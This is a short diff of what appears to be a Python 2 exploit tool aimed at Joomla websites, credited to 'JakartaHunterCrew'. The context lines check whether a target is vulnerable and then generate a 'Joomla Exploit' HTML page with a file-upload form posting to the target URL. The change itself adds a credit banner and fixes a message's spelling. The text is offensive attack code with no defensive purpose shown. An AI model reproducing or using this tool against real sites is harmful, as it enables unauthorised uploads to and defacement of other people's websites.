@@ -220,7 +220,7 @@ while True:
 		print check2
 
 		if check2 != vu:
-			print "\033[1;31m[-] Website vuln. Hajaar !\033[1;39m"
+			print "\033[1;31m[-] Website vuln. Hajarr !\033[1;39m"
 			jinxpro = "payload/index.html"
 		else:
 			print "[+] Website tidak vuln"
@@ -243,6 +243,7 @@ while True:
 			expl.write('<h1 style="color:green;">Joomla Exploit</h1> \n')
 			expl.write('<form method="POST" action="'+ur+'" enctype="multipart/form-data"> \n')
 			expl.write('<input type="file" name="file"><button>Exploit</button> \n')
+			expl.write('<marquee>Powered by JakartaHunterCrew</marquee>\n')
 			expl.write('</form> \n')
 			expl.write('</<center></body></html> \n')
 			expl.close()
